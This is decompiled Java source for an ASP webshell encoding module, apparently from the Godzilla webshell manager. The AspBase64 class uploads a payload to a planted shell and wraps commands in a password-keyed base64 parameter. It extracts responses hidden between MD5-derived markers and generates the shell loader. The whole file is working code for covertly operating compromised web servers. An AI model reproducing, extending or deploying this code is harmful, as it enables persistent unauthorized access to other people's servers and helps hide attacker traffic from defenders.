//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.cryptions.aspXor;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.net.URLEncoder;
import shells.channel.HttpRequestChannel;
import shells.channel.RequestChannel;
import util.Log;
import util.functions;

@CryptionAnnotation(
        Name = "ASP_BASE64",
        payloadName = "AspDynamicPayload"
)
public class AspBase64 implements Cryption {
    private ShellEntity shell;
    private RequestChannel request;
    private byte[] key;
    private boolean state;
    private String pass;
    private byte[] payload;
    private byte[] findStrLeft;
    private byte[] findStrRight;
    private String suffix = "asp";

    public AspBase64() {
    }

    public void init(ShellEntity context) {
        this.shell = context;
        this.key = this.shell.getSecretKeyX().getBytes();
        this.pass = this.shell.getPassword();
        this.request = new HttpRequestChannel(context);
        context.setRequest(this.request);
        String findStrMd5 = functions.md5(this.pass + new String(this.key));
        this.findStrLeft = findStrMd5.substring(0, 6).getBytes();
        this.findStrRight = findStrMd5.substring(20, 26).getBytes();

        try {
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.request.sendRequest(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }

        } catch (Exception var4) {
            Log.error(var4);
        }
    }

    public byte[] encode(byte[] data) {
        try {
            return this.E(data);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

    public byte[] decode(byte[] data) {
        if (data != null && data.length > 0) {
            try {
                return this.D(this.findStr(data));
            } catch (Exception var3) {
                Log.error(var3);
                return null;
            }
        } else {
            return data;
        }
    }

    public boolean isSendRLData() {
        return true;
    }

    protected void decryption(byte[] data, byte[] key) {
        int len = data.length;
        int keyLen = key.length;


        for(int i = 1; i <= len; ++i) {
            int index = i - 1;
            data[index] ^= key[i % keyLen];
        }

    }

    public byte[] E(byte[] cs) {
        return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();
    }

    public byte[] D(byte[] data) {
        byte[] cs = functions.base64Decode(data);
        return cs;
    }

    public byte[] findStr(byte[] respResult) {
        return functions.subMiddleBytes(respResult, this.findStrLeft, this.findStrRight);
    }

    public boolean check() {
        return this.state;
    }

    public String getSuffix() {
        return this.suffix;
    }

    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), this.getClass().getSimpleName());
    }
}
